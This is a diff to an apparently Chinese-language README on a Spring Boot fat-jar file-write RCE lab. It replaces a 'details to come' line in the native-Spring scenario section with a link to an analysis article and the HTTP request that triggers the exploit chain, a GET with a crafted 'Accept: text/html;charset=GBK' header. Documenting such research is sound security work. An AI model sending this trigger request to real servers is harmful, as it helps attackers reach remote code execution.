@@ -286,7 +286,16 @@ docker run -d -p 18081:18081 landgrey/spring-boot-fat-jar-write-file-rce:1.2
 
 #### 0. spring 原生场景
 
-spring 框架自带的一条利用链，补充细节后公开，敬请期待。
+spring 框架自带的一条利用链，细节分析见[参考文章](https://landgrey.me/blog/22/)。
+
+触发漏洞数据包：
+
+```
+GET / HTTP/1.1
+Accept: text/html;charset=GBK
+
+
+```
 
 
 
